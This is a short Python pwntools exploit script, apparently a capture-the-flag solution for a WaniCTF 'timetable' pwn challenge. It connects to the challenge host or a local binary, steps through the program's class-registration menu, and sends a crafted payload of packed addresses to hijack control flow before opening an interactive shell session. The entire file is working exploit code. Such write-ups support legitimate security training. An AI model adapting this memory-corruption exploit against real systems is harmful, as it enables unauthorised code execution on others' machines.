#!/usr/bin/python3

from pwn import *

exe = ELF('./chall', checksec=False)
libc = ELF('./libc6_2.35-0ubuntu3_amd64.so', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*register_elective_class+0
                b*register_elective_class+211

                # c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('timetable-pwn.wanictf.org', 9008)
else:
    p = process(exe.path)


GDB()

sa(b"name : ", b"a" * 9)
sla(b"id : ", b"1234567")
sla(b"major : ", b"1234567")

sla(b">", b"1")
sla(b">", b"1")

sla(b">", b"4")
sla(b">", b"FRI 3")
sla(b"CLASS\n", b"a"*1)


sla(b">", b"2")
sla(b">", b"1")

sla(b">", b"4")
sla(b">", b"FRI 3")
sa(b"CLASS\n", p64(0x405280) + p64(0x401337))

# sla(b">", b"2")
# sla(b">", b"1")
p.interactive()
